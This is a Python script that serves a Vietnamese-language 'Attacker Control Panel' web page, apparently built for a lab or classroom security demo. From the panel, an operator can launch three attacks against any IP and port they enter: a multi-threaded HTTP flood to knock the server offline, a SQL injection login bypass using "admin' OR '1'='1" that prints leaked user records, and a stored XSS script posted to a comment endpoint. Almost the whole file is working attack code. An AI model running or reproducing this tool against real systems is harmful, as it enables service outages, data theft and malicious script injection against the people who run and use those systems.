#!/usr/bin/env python3
"""
attacker_web.py - Giao dien Web GUI truc quan cho Ben Tan Cong (Attacker Control Panel)
Chay hoan toan bang thu vien chuan Python (Khong can cai dat them thu vien ngoai).
Truy cap qua trinh duyet: http://<IP_Ubuntu>:5000/
"""
import sys
import time
import json
import threading
import urllib.request
import urllib.parse
import urllib.error
from http.server import HTTPServer, BaseHTTPRequestHandler

TARGET_CONFIG = {
    "ip": "192.168.144.1",
    "port": 8080
}

HTML_PAGE = """<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bảng Điều Khiển Tấn Công - Attacker Control Panel</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body {
            background-color: #0b0f19;
            color: #e2e8f0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            padding: 30px 15px;
        }
        .main-card {
            background-color: #151c2c;
            border: 1px solid #2d3748;
            border-radius: 14px;
            padding: 30px;
            max-width: 900px;
            margin: 0 auto;
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.5);
        }
        .console-box {
            background-color: #080c14;
            border: 1px solid #1f2937;
            border-radius: 8px;
            padding: 20px;
            font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace;
            font-size: 14px;
            min-height: 250px;
            max-height: 400px;
            overflow-y: auto;
            white-space: pre-wrap;
            color: #38bdf8;
            margin-top: 25px;
        }
        .btn-attack {
            font-weight: 700;
            padding: 12px 20px;
            border-radius: 8px;
            font-size: 15px;
            transition: all 0.2s;
        }
        .btn-dos { background-color: #ef4444; color: white; border: none; }
        .btn-dos:hover { background-color: #dc2626; color: white; }
        .btn-sqli { background-color: #f59e0b; color: white; border: none; }
        .btn-sqli:hover { background-color: #d97706; color: white; }
        .btn-xss { background-color: #8b5cf6; color: white; border: none; }
        .btn-xss:hover { background-color: #7c3aed; color: white; }
    </style>
</head>
<body>
    <div class="main-card">
        <div class="d-flex justify-content-between align-items-center mb-4 pb-3 border-bottom border-secondary">
            <div>
                <h3 class="fw-bold mb-1 text-danger">BẢNG ĐIỀU KHIỂN TẤN CÔNG (ATTACKER PANEL)</h3>
                <p class="text-secondary mb-0 small">Giao diện trực quan phát động kiểm thử an ninh mạng tới Web Server</p>
            </div>
            <span class="badge bg-danger px-3 py-2 fs-6">Hacker / Red Team</span>
        </div>

        <!-- Cấu hình Target -->
        <div class="row g-3 mb-4">
            <div class="col-md-8">
                <label class="form-label small fw-bold text-secondary">ĐỊA CHỈ IP MÁY CHỦ MỤC TIÊU</label>
                <input type="text" id="target-ip" class="form-control bg-dark text-white border-secondary py-2" value="192.168.144.1">
            </div>
            <div class="col-md-4">
                <label class="form-label small fw-bold text-secondary">CỔNG DỊCH VỤ (PORT)</label>
                <input type="number" id="target-port" class="form-control bg-dark text-white border-secondary py-2" value="8080">
            </div>
        </div>

        <!-- Các nút chọn đòn tấn công -->
        <div class="row g-3 mb-3">
            <div class="col-md-4">
                <button onclick="launchAttack('dos')" class="btn btn-attack btn-dos w-100" id="btn-dos">
                    Tấn Công DoS (Làm Sập)
                </button>
            </div>
            <div class="col-md-4">
                <button onclick="launchAttack('sqli')" class="btn btn-attack btn-sqli w-100" id="btn-sqli">
                    Tấn Công SQL Injection
                </button>
            </div>
            <div class="col-md-4">
                <button onclick="launchAttack('xss')" class="btn btn-attack btn-xss w-100" id="btn-xss">
                    Tấn Công XSS (Mã Độc)
                </button>
            </div>
        </div>

        <!-- Màn hình kết quả & Phản đòn -->
        <div class="d-flex justify-content-between align-items-center mt-4">
            <span class="fw-bold small text-secondary">KẾT QUẢ GHI NHẬN & PHẢN ĐÒN TỪ MÁY CHỦ:</span>
            <button onclick="clearConsole()" class="btn btn-sm btn-outline-secondary">Xóa màn hình</button>
        </div>
        <div id="console-output" class="console-box">[Sẵn sàng] Hãy nhập IP mục tiêu và bấm nút để phát động đòn tấn công...</div>
    </div>

    <script>
        function log(msg) {
            const box = document.getElementById('console-output');
            box.innerText += '\\n' + msg;
            box.scrollTop = box.scrollHeight;
        }

        function clearConsole() {
            document.getElementById('console-output').innerText = '[Sẵn sàng] Đã xóa lịch sử log.';
        }

        async function launchAttack(type) {
            const ip = document.getElementById('target-ip').value.trim();
            const port = document.getElementById('target-port').value.trim();
            if (!ip) { alert('Vui lòng nhập IP mục tiêu!'); return; }

            log(`\\n>>> [KÍCH HOẠT] Đang phát động tấn công ${type.toUpperCase()} tới http://${ip}:${port}...`);

            try {
                const res = await fetch(`/api/attack?type=${type}&ip=${encodeURIComponent(ip)}&port=${encodeURIComponent(port)}`);
                const data = await res.json();
                log(data.output);
            } catch (e) {
                log('[-] Lỗi kết nối tới tiến trình Attacker: ' + e);
            }
        }
    </script>
</body>
</html>
"""

def execute_dos(target_ip, target_port):
    url = f"http://{target_ip}:{target_port}/api/search?q=dos_flood_attack"
    stop_event = threading.Event()
    results = {"total_sent": 0, "success": 0, "crashed_503": 0, "dropped_by_os": 0}
    lock = threading.Lock()

    def worker():
        while not stop_event.is_set():
            try:
                req = urllib.request.Request(url, headers={"User-Agent": "DoS-Attacker/2.0"})
                with urllib.request.urlopen(req, timeout=1.5) as r:
                    with lock:
                        results["total_sent"] += 1
                        if r.status == 200: results["success"] += 1
            except urllib.error.HTTPError as e:
                with lock:
                    results["total_sent"] += 1
                    if e.code == 503: results["crashed_503"] += 1
            except Exception:
                with lock:
                    results["total_sent"] += 1
                    results["dropped_by_os"] += 1
            time.sleep(0.05)

    threads = [threading.Thread(target=worker, daemon=True) for _ in range(15)]
    for t in threads: t.start()
    time.sleep(6)
    stop_event.set()
    for t in threads: t.join(timeout=0.5)

    if results["crashed_503"] >= 10:
        return f"[+] Bằng chứng DoS: Máy chủ đã bị sập và trả về lỗi 503 Service Unavailable ({results['crashed_503']} kết nối bị từ chối phục vụ!)."
    elif results["dropped_by_os"] > 10:
        return f"[-] Phản đòn từ máy chủ: Bạn đã bị tấn công ngược! IP của bạn đã bị Tường lửa máy chủ khóa toàn bộ kết nối ({results['dropped_by_os']} gói tin bị hủy tại chỗ)."
    else:
        return f"[*] Đã gửi {results['total_sent']} gói. Số gói 503: {results['crashed_503']}, Số gói bị drop: {results['dropped_by_os']}."

def execute_sqli(target_ip, target_port):
    payload = urllib.parse.quote("admin' OR '1'='1")
    url = f"http://{target_ip}:{target_port}/api/login?user={payload}&pass=any"
    try:
        req = urllib.request.Request(url, headers={"User-Agent": "Attacker-SQLi/2.0"})
        with urllib.request.urlopen(req, timeout=3.0) as resp:
            data = json.loads(resp.read().decode())
            out = "[+] Bằng chứng SQL Injection: Trích xuất thành công CSDL từ máy chủ:\n"
            for u in data.get("leaked_database", []):
                out += f"    ID: {u['id']} | Tên: {u['full_name']} | Tài khoản: {u['username']} | Số dư: {u['balance']}\n"
            return out.strip()
    except Exception as e:
        return "[-] Phản đòn từ máy chủ: Bạn đã bị tấn công ngược! IP của bạn đã bị Tường lửa máy chủ khóa toàn bộ kết nối."

def execute_xss(target_ip, target_port):
    script_payload = urllib.parse.quote("<script>alert(1)</script>")
    url = f"http://{target_ip}:{target_port}/api/comment?author=Attacker&content={script_payload}"
    try:
        req = urllib.request.Request(url, headers={"User-Agent": "Attacker-XSS/2.0"})
        with urllib.request.urlopen(req, timeout=3.0) as resp:
            return "[+] Bằng chứng XSS: Máy chủ đã chấp nhận và lưu mã độc vào hệ thống."
    except Exception as e:
        return "[-] Phản đòn từ máy chủ: Bạn đã bị tấn công ngược! IP của bạn đã bị Tường lửa máy chủ khóa toàn bộ kết nối."

class AttackerHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed = urllib.parse.urlparse(self.path)
        if parsed.path == "/" or parsed.path == "/index.html":
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.end_headers()
            self.wfile.write(HTML_PAGE.encode("utf-8"))
        elif parsed.path == "/api/attack":
            qs = urllib.parse.parse_qs(parsed.query)
            attack_type = qs.get("type", ["dos"])[0]
            ip = qs.get("ip", [TARGET_CONFIG["ip"]])[0]
            port = int(qs.get("port", [str(TARGET_CONFIG["port"])])[0])

            if attack_type == "dos":
                res = execute_dos(ip, port)
            elif attack_type == "sqli":
                res = execute_sqli(ip, port)
            elif attack_type == "xss":
                res = execute_xss(ip, port)
            else:
                res = "Loại tấn công không hợp lệ."

            self.send_response(200)
            self.send_header("Content-Type", "application/json; charset=utf-8")
            self.end_headers()
            self.wfile.write(json.dumps({"output": res}, ensure_ascii=False).encode("utf-8"))
        else:
            self.send_response(404)
            self.end_headers()

    def log_message(self, format, *args):
        # Tắt log stdout mặc định của server để console gọn gàng
        return

def run_web_server(port=5000):
    server = HTTPServer(("0.0.0.0", port), AttackerHandler)
    print("=" * 65)
    print(f"   [ATTACKER WEB CONTROL PANEL] DANG CHAY TAI PORT {port}")
    print(f"   👉 Mo trinh duyet truy cap: http://<IP_Ubuntu>:{port}/")
    print(f"   (Vi du: http://192.168.144.130:{port}/)")
    print("=" * 65)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] Da tat Web Panel.")

if __name__ == "__main__":
    run_web_server(port=5000)
